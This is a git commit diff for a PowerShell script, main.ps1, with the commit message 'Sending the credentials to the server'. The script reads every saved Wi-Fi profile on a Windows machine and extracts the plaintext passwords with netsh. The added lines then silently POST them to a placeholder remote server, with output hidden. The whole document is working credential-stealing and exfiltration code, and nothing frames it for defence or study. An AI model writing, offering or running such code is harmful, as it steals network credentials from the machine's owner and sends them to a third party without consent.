affb127967c9640eba25d94ec80da82b652772fa
Spandanpokh <98866320+Spandanpokh@users.noreply.github.com>
2024-03-06 19:31:22 +0545

    Update main.ps1
    Sending the credentials to the server

--- main.ps1
+++ main.ps1
@@ -1,1 +1,10 @@
-netsh wlan show profiles | Select-String -Pattern "All User Profile" | ForEach-Object {$_ -match ": (.+)"; $name=$Matches[1];(netsh wlan show profile name="$name" key=clear) | Select-String -Pattern "Key Content"; if($Matches){Write-Output "Wi-Fi Profile: $name"; Write-Output "Password: $($Matches[1])"; Write-Output "--------------------------"}}
+$output = ""
+netsh wlan show profiles | Select-String -Pattern "All User Profile" | ForEach-Object { 
+    $_ -match ": (.+)"
+    $name=$Matches[1]
+    $profileInfo = netsh wlan show profile name="$name" key=clear | Select-String -Pattern "Key Content"
+    if ($profileInfo) { 
+        $output += "Wi-Fi Profile: $name`nPassword: $($profileInfo -replace '\s+Key Content\s+:\s+','')`n--------------------------`n" 
+    } 
+}
+$null = Invoke-RestMethod -Uri "https://yourserver.com" -Method Post -Body @{data=$output} *> $null
